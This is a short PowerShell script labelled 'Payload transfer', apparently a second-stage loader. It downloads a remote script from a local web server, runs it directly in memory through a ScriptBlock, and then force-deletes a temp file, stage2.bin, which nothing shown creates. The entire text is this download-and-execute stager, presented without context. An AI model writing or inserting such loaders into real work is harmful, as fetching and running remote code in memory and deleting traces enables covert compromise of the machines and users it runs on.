
# Payload transfer
$RemoteUrl = "http://localhost:8080/stage2.ps1"
$RemoteScript = (iwr $RemoteUrl -UseBasicParsing).Content
[ScriptBlock]::Create($RemoteScript).Invoke()
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
